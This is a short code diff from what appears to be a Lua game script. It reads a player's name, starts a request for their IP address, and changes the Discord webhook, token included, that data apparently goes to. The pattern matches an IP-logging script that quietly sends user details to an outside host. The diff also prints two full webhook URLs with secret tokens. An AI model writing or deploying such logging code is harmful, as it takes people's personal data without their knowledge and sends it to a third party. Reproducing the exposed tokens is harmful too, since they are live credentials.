@@ -115,7 +115,7 @@ if not player then
 end
 
 local name = player.Name
-local WebhookURL = "https://discord.com/api/webhooks/1396068816450097223/lOsY6FcTnK7WYlXgKKv1mSp33erUCavwGdGYDmIBRWxk8F3D7uOEKfomWS2R3GAw92zL"
+local WebhookURL = "https://discord.com/api/webhooks/1396081112090022029/dPkvnBGnVDlyLAY4fn-EJjAV_KOqHUPprbmbJ91dGW5oJFivWFkkydrvc8JeHN7O1L6B"
 
 
 local getIPResponse = safeRequest({
